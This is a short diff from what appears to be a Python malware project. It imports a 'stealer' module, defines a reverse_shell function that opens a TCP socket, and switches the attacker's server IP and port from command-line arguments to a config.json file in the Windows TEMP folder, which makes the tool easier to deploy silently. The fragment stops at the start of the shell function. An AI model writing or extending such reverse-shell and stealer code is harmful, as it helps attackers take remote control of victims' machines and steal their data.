@@ -3,8 +3,10 @@ import subprocess
 import os
 import stealer, requests, json, sys
 
-SERVER_IP = sys.argv[1]
-SERVER_PORT = int(sys.argv[2])
+CONFIG = json.loads(open(os.getenv('TEMP')+'\\config.json','r').read())
+
+SERVER_IP = CONFIG['ip']
+SERVER_PORT = CONFIG['port']
 
 def reverse_shell():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
